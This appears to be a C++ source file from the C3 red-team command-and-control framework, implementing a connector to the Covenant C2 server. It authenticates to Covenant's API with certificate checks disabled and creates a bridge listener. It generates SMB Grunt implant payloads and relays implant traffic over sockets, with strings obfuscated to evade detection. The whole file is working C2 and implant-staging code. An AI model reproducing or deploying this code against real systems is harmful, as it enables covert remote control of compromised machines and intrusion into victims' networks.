#include "StdAfx.h"
#include "Common/MWR/Sockets/SocketsException.h"
#include "Common/json/json.hpp"
#include "Common/CppRestSdk/include/cpprest/http_client.h"
#include "Common/MWR/Crypto/Base64.h"
#include "Common/MWR/CppTools/Compression.h"

using json = nlohmann::json;

namespace MWR::C3::Interfaces::Connectors
{
	/// A class representing communication with Covenant.
	struct Covenant : Connector<Covenant>
	{
		/// Public constructor.
		/// @param arguments factory arguments.
		Covenant(ByteView arguments);

		/// A public destructor.
		~Covenant();

		/// OnCommandFromConnector callback implementation.
		/// @param binderId Identifier of Peripheral who sends the Command.
		/// @param command full Command with arguments.
		void OnCommandFromBinder(ByteView binderId, ByteView command) override;

		/// Processes internal (C3 API) Command.
		/// @param command a buffer containing whole command and it's parameters.
		/// @return command result.
		ByteVector OnRunCommand(ByteView command) override;

		/// Called every time new implant is being created.
		/// @param connectionId adders of Grunt in C3 network .
		/// @param data parameters used to create implant. If payload is empty, new one will be generated.
		/// @param isX64 indicates if relay staging beacon is x64.
		/// @returns ByteVector correct command that will be used to stage beacon.
		ByteVector PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64) override;

		/// Return json with commands.
		/// @return ByteView Commands description in JSON format.
		static ByteView GetCapability();

	private:
		/// Represents a single C3 <-> Covenant connection, as well as each Grunt in network.
		struct Connection
		{
			/// Constructor.
			/// @param listeningPostAddress adders of Bridge.
			/// @param listeningPostPort port of Bridge.
			/// @param owner weak pointer to Covenant class.
			/// @param id id used to address Grunt.
			Connection(std::string_view listeningPostAddress, uint16_t listeningPostPort, std::weak_ptr<Covenant> owner, std::string_view id = ""sv);

			/// Destructor.
			~Connection();

			/// Sends data directly to Covenant.
			/// @param data buffer containing blob to send.
			/// @remarks throws MWR::WinSocketsException on WinSockets error.
			void Send(ByteView data);

			/// Creates the receiving thread.
			/// As long as connection is alive detached thread will pull available data Covenant.
			void StartUpdatingInSeparateThread();

			/// Reads data from Socket.
			/// @return heartbeat read data.
			ByteVector Receive();

			/// Indicates that receiving thread was already started.
			/// @returns true if receiving thread was started, false otherwise.
			bool SecondThreadStarted();

		private:
			/// Pointer to TeamServer instance.
			std::weak_ptr<Covenant> m_Owner;

			/// A socket object used in communication with the Bridge listener.
			SOCKET m_Socket;

			/// RouteID in binary form. Address of beacon in network.
			ByteVector m_Id;

			/// Indicates that receiving thread was already started.
			bool m_SecondThreadStarted = false;
		};

		/// Retrieves grunt payload from Covenant using the API.
		/// @param binderId address of beacon in network.
		/// @param pipename name of pipe hosted by the SMB Grunt.
		/// @param delay number of seconds for SMB grunt to block for
		/// @param jitter percent to jitter the delay by
		/// @param listenerId the id of the Bridge listener for covenant
		/// @return generated payload.
		MWR::ByteVector GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t listenerId, uint32_t connectAttempts);

		/// Close desired connection
		/// @arguments arguments for command. connection Id in string form.
		/// @returns ByteVector empty vector.
		MWR::ByteVector CloseConnection(ByteView arguments);

		/// Initializes Sockets library. Can be called multiple times, but requires corresponding number of calls to DeinitializeSockets() to happen before closing the application.
		/// @return value forwarded from WSAStartup call (zero if successful).
		static int InitializeSockets();

		/// Deinitializes Sockets library.
		/// @return true if successful, otherwise WSAGetLastError might be called to retrieve specific error number.
		static bool DeinitializeSockets();

		/// IP Address of Bridge Listener.
		std::string m_ListeningPostAddress;

		/// Port of Bridge Listener.
		uint16_t m_ListeningPostPort;

		///Covenant host for web API
		std::string m_webHost;

		///Covenant username
		std::string m_username;

		///Covenant password
		std::string m_password;

		///API token, generated on logon.
		std::string m_token;

		///member for listener
		int m_ListenerId;

		/// Access mutex for m_ConnectionMap.
		std::mutex m_ConnectionMapAccess;

		/// Access mutex for sending data to Covenant.
		std::mutex  m_SendMutex;

		/// Map of all connections.
		std::unordered_map<std::string, std::unique_ptr<Connection>> m_ConnectionMap;

		bool UpdateListenerId();
	};
}

bool MWR::C3::Interfaces::Connectors::Covenant::UpdateListenerId()
{
	std::string url = this->m_webHost + OBF("/api/listeners");
	std::pair<std::string, uint16_t> data;
	json response;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false); //Covenant framework is unlikely to have a valid cert.

	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
	web::http::http_request request;

	request = web::http::http_request(web::http::methods::GET);

	std::string authHeader = OBF("Bearer ") + this->m_token;
	request.headers().add(OBF_W(L"Authorization"), utility::conversions::to_string_t(authHeader));
	pplx::task<web::http::http_response> task = webClient.request(request);
	
	web::http::http_response resp = task.get();
	
	if (resp.status_code() != web::http::status_codes::OK)
		throw std::exception((OBF("[Covenant] Error getting Listeners, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
	
	//Get the json response
	auto respData = resp.extract_string();
	response = json::parse(respData.get());

	for (auto& listeners : response)
	{
		if (listeners[OBF("name")] != OBF("C3Bridge"))
			continue;
	
		this->m_ListenerId = listeners[OBF("id")].get<int>();
		this->m_ListeningPostAddress = listeners[OBF("connectAddresses")][0].get<std::string>();
		this->m_ListeningPostPort = listeners[OBF("connectPort")];
		return true;
	}

	return false; //we didn't find the listener
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
{
	json postData;
	json response;

	std::tie(m_ListeningPostPort, m_webHost, m_username, m_password) = arguments.Read<uint16_t, std::string, std::string, std::string>();

	// if the last character is '/' remove it
	if (this->m_webHost.back() == '/')
		this->m_webHost.pop_back();


	/***Authenticate to Web API ***/
	std::string url = this->m_webHost + OBF("/api/users/login");

	postData[OBF("username")] = this->m_username;
	postData[OBF("password")] = this->m_password;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false); //Covenant framework is unlikely to have a valid cert.

	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
	web::http::http_request request;

	request = web::http::http_request(web::http::methods::POST);
	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
	request.set_body(utility::conversions::to_string_t(postData.dump()));

	pplx::task<web::http::http_response> task = webClient.request(request);
	web::http::http_response resp = task.get();

	if (resp.status_code() == web::http::status_codes::OK)
	{
		//Get the json response
		auto respData = resp.extract_string();
		response = json::parse(respData.get());
	}
	else
		throw std::exception((OBF("[Covenant] Error authenticating to web app, HTTP resp: ") + std::to_string(resp.status_code())).c_str());

	//Get the token to be used for all other requests.
	if (response[OBF("success")])
		this->m_token = response[OBF("covenantToken")].get<std::string>();
	else
		throw std::exception(OBF("[Covenant] Could not get token, invalid logon"));

	//If the listener doesn't already exist create it.
	if (!UpdateListenerId())
	{
		//extract ip address from url
		size_t start = 0, end = 0;
		start = url.find("://") + 3;
		end = url.find(":", start + 1);
		
		if (start == std::string::npos || end == std::string::npos || end > url.size())
			throw std::exception(OBF("[Covenenat] Incorrect URL, must be of the form http|https://hostname|ip:port - eg https://192.168.133.171:7443"));

		this->m_ListeningPostAddress = url.substr(start, end - start);

		///Create the bridge listener
		url = this->m_webHost + OBF("/listener/createbridge");
		web::http::client::http_client webClientBridge(utility::conversions::to_string_t(url), config);
		request = web::http::http_request(web::http::methods::POST);
		request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/x-www-form-urlencoded")));

		std::string authHeader = OBF("Bearer ") + this->m_token;
		request.headers().add(OBF_W(L"Authorization"), utility::conversions::to_string_t(authHeader));

		std::string createBridgeString = "Id=0&GUID=b85ea642f2&ListenerTypeId=2&Status=Active&CovenantToken=&Description=A+Bridge+for+custom+listeners.&Name=C3Bridge&BindAddress=0.0.0.0&BindPort=" + \
			std::to_string(this->m_ListeningPostPort) + "&ConnectPort=" + std::to_string(this->m_ListeningPostPort) + "&ConnectAddresses%5B0%5D=" + \
			this->m_ListeningPostAddress + "&ProfileId=3";
		request.set_body(utility::conversions::to_string_t(createBridgeString));

		task = webClientBridge.request(request);
		resp = task.get();

		if (resp.status_code() != web::http::status_codes::OK)
			throw std::exception((OBF("[Covenant] Error setting up BridgeListener, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
		
		if(!UpdateListenerId()) //now get the id of the listener
				throw std::exception((OBF("[Covenant] Error getting ListenerID after creation")));
	}

	InitializeSockets();
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Connectors::Covenant::~Covenant()
{
	DeinitializeSockets();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Connectors::Covenant::OnCommandFromBinder(ByteView binderId, ByteView command)
{
	std::scoped_lock<std::mutex> lock(m_ConnectionMapAccess);

	auto it = m_ConnectionMap.find(binderId);
	if (it == m_ConnectionMap.end())
		throw std::runtime_error{ OBF("Unknown connection") };

	if (!(it->second->SecondThreadStarted()))
		it->second->StartUpdatingInSeparateThread();

	it->second->Send(command);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int MWR::C3::Interfaces::Connectors::Covenant::InitializeSockets()
{
	WSADATA wsaData;
	WORD wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	return WSAStartup(wVersionRequested, &wsaData);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool MWR::C3::Interfaces::Connectors::Covenant::DeinitializeSockets()
{
	return WSACleanup() == 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t listenerId, uint32_t connectAttempts)
{
	if (binderId.empty() || pipename.empty())
		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };

	std::string authHeader = OBF("Bearer ") + this->m_token;
	std::string contentHeader = OBF("Content-Type: application/json");
	std::string binary;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false);
	web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + OBF("/api/launchers/binary")), config);
	web::http::http_request request;

	//The data to create an SMB Grunt
	json postData;
	postData[OBF("id")] = this->m_ListenerId;
	postData[OBF("smbPipeName")] = pipename;
	postData[OBF("listenerId")] = this->m_ListenerId;
	postData[OBF("outputKind")] = OBF("ConsoleApplication");
	postData[OBF("implantTemplateId")] = 2; //for GruntSMB template
	postData[OBF("dotNetFrameworkVersion")] = OBF("Net40");
	postData[OBF("type")] = OBF("Wmic");
	postData[OBF("delay")] = delay;
	postData[OBF("jitterPercent")] = jitter;
	postData[OBF("connectAttempts")] = connectAttempts;

	//First we use a PUT to add our data as the template.
	request = web::http::http_request(web::http::methods::PUT);
	try
	{
		request.headers().set_content_type(utility::conversions::to_string_t("application/json"));
		request.set_body(utility::conversions::to_string_t(postData.dump()));

		request.headers().add(OBF_W(L"Authorization"), utility::conversions::to_string_t(authHeader));
		pplx::task<web::http::http_response> task = webClient.request(request);
		web::http::http_response resp = task.get();

		//If we get 200 OK, then we use a POST to request the generation of the payload. We can reuse the previous data here.
		if (resp.status_code() == web::http::status_codes::OK)
		{
			request.set_method(web::http::methods::POST);
			task = webClient.request(request);
			resp = task.get();

			if (resp.status_code() == web::http::status_codes::OK)
			{
				auto respData = resp.extract_string();
				json resp = json::parse(respData.get());
				binary = resp[OBF("base64ILByteString")].get<std::string>(); //Contains the base64 encoded .NET assembly.
			}
			else
				throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned: ") + std::to_string(resp.status_code()));
		}
		else
			throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned: ") + std::to_string(resp.status_code()));

		auto payload = cppcodec::base64_rfc4648::decode(binary);
		
		//Finally connect to the socket.
		auto connection = std::make_unique<Connection>(m_ListeningPostAddress, m_ListeningPostPort, std::static_pointer_cast<Covenant>(shared_from_this()), binderId);
		m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
		return payload;
	}
	catch(std::exception&)
	{
		throw std::exception(OBF("Error generating payload"));
	}
}

MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::CloseConnection(ByteView arguments)
{
	m_ConnectionMap.erase(arguments);
	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::OnRunCommand(ByteView command)
{
	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
		//	case 0:
		//		return GeneratePayload(command);
	case 1:
		return CloseConnection(command);
	default:
		return AbstractConnector::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteView MWR::C3::Interfaces::Connectors::Covenant::GetCapability()
{
	return R"(
	{
	"create":
	{
		"arguments":
		[
			{
				"type": "uint16",
				"name": "C2BridgePort",
				"min": 2,
				"defaultValue": 8000,
				"randomize": true,
				"description": "The port for the C2Bridge Listener if it doesn't already exist."
			},
			{
				"type": "string",
				"name": "Covenant Web Host",
				"min": 1,
				"description": "Host for Covenant - eg https://localhost:7443/"
			},
			{
				"type": "string",
				"name": "Username",
				"min": 1,
				"description": "Username to authenticate"
			},
			{
				"type": "string",
				"name": "Password",
				"min": 1,
				"description": "Password to authenticate"
			}
		]
	},
	"commands":
	[
		{
			"name": "Close connection",
			"description": "Close socket connection with TeamServer if beacon is not available",
			"id": 1,
			"arguments":
			[
				{
					"name": "Route Id",
					"min": 1,
					"description": "Id associated to beacon"
				}
			]
		}
	]
}
)";
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Connectors::Covenant::Connection::Connection(std::string_view listeningPostAddress, uint16_t listeningPostPort, std::weak_ptr<Covenant> owner, std::string_view id)
	: m_Owner(owner)
	, m_Id(ByteView{ id })
{

	/*** Connect to C2Bridge ***/
	sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(listeningPostPort);
	switch (InetPtonA(AF_INET, &listeningPostAddress.front(), &client.sin_addr.s_addr))									//< Mod to solve deprecation issue.
	{
	case 0:
		throw std::invalid_argument(OBF("Provided Listening Post address in not a valid IPv4 dotted - decimal string or a valid IPv6 address."));
	case -1:
		throw MWR::SocketsException(OBF("Couldn't convert standard text IPv4 or IPv6 address into its numeric binary form. Error code : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
	}

	// Attempt to connect.
	if (INVALID_SOCKET == (m_Socket = socket(AF_INET, SOCK_STREAM, 0)))
		throw MWR::SocketsException(OBF("Couldn't create socket."), WSAGetLastError());

	if (SOCKET_ERROR == connect(m_Socket, (struct sockaddr*) & client, sizeof(client)))
		throw MWR::SocketsException(OBF("Could not connect to ") + std::string{ listeningPostAddress } +OBF(":") + std::to_string(listeningPostPort) + OBF("."), WSAGetLastError());

}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Connectors::Covenant::Connection::~Connection()
{
	closesocket(m_Socket);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Connectors::Covenant::Connection::Send(ByteView data)
{
	auto owner = m_Owner.lock();
	if (!owner)
		throw std::runtime_error(OBF("Could not lock pointer to owner "));

	std::unique_lock<std::mutex> lock{ owner->m_SendMutex };

	auto unpacked = Compression::Decompress<Compression::Deflate>(data);

	//Format the length to match how it is read by Covenant.
	DWORD length = static_cast<DWORD>(unpacked.size());
	BYTE* bytes = (BYTE*)& length;
	DWORD32 chunkLength = (bytes[0] << 24) + (bytes[1] << 16) + (bytes[2] << 8) + bytes[3];

	// Write four bytes indicating the length of the next chunk of data.
	if (SOCKET_ERROR == send(m_Socket, (char *)&chunkLength, 4, 0))
		throw MWR::SocketsException(OBF("Error sending to Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());

	// Write the chunk to socket.
	send(m_Socket, (char *)&unpacked.front(), length, 0);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::Connection::Receive()
{
	DWORD chunkLength = 0, bytesRead;
	if (SOCKET_ERROR == (bytesRead = recv(m_Socket, reinterpret_cast<char*>(&chunkLength), 4, 0)))
		throw MWR::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + ("."), WSAGetLastError());

	if (!bytesRead || !chunkLength)
		return {};																										//< The connection has been gracefully closed.

	//Format the length to match how it is written by Covenant.
	BYTE* bytes = (BYTE*)& chunkLength;
	DWORD32 len = (bytes[0] << 24) + (bytes[1] << 16) + (bytes[2] << 8) + bytes[3];

	// Read in the result.
	ByteVector buffer;
	buffer.resize(len);
	for (DWORD bytesReadTotal = 0; bytesReadTotal < len; bytesReadTotal += bytesRead)
		switch (bytesRead = recv(m_Socket, reinterpret_cast<char*>(&buffer[bytesReadTotal]), len - bytesReadTotal, 0))
		{
		case 0:
			return {};																									//< The connection has been gracefully closed.

		case SOCKET_ERROR:
			throw MWR::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
		}

	return Compression::Compress<Compression::Deflate>(buffer);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Connectors::Covenant::Connection::StartUpdatingInSeparateThread()
{
	m_SecondThreadStarted = true;
	std::thread([&]()
		{
			// Lock pointers.
			auto owner = m_Owner.lock();
			auto bridge = owner->GetBridge();
			while (bridge->IsAlive())
			{
				try
				{
					// Read packet and post it to Binder.
					if (auto packet = Receive(); !packet.empty())
					{
						if (packet.size() == 1u && packet[0] == 0u)
							Send(packet);
						else
							bridge->PostCommandToBinder(ByteView{ m_Id }, packet);
					}
				}
				catch (std::exception& e)
				{
					bridge->Log({ e.what(), LogMessage::Severity::Error });
				}
			}
		}).detach();
}

bool MWR::C3::Interfaces::Connectors::Covenant::Connection::SecondThreadStarted()
{
	return m_SecondThreadStarted;
}

MWR::ByteVector MWR::C3::Interfaces::Connectors::Covenant::PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64)
{
	auto [pipeName, listenerId, delay, jitter, connectAttempts] = data.Read<std::string, uint32_t, uint32_t, uint32_t, uint32_t>();


	return ByteVector{}.Write(pipeName, GeneratePayload(connectionId, pipeName, delay, jitter, listenerId, connectAttempts), connectAttempts);
}



